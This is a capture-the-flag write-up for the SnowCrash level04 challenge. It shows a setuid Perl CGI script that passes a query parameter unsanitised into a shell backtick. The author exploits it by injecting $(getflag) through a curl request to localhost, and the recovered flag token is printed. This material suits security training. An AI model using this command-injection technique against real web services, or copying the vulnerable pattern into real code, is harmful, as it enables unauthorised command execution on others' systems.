when we start the level we get 

level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile

so that means thaat running the level04 pl can be run as the user flag04 

checking the code

level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));


we see that this is a CGI (Common Gate Interface running at port 4747) we see a similar structure that on last problems showing an echo we see that the first parameter to the function is given to the variable "y" then that variable is whown as echo finally this subrutine is run calling for the param("x") (meaning the x  variable in the query string)

so the strategy here is to call a subshell in the variable y so ideally $(getflag) to do this (and consider expansions in shell) we run the following command 


level04@SnowCrash:~$ curl localhost:4747?x='"$(getflag)"'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
